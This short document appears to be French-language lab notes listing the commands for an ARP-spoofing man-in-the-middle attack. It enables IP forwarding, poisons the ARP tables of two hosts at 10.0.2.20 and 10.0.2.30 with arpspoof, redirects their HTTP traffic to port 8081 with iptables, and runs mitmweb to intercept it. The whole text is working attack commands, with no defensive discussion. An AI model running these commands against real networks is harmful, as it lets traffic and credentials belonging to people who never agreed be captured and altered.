# Activer le transfert IP
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Empoisonner les tables ARP
- sudo arpspoof -i enp0s8 -t 10.0.2.20 10.0.2.30
- sudo arpspoof -i enp0s8 -t 10.0.2.30 10.0.2.20

# Rediriger le trafic HTTP vers le port 8081
sudo iptables -t nat -A PREROUTING -i enp0s8 -p tcp --dport 80 -j REDIRECT --to-port 8081

# Lancer mitmweb sur le port 8081, écouter sur toutes les interfaces
sudo mitmweb -p 8081 --host
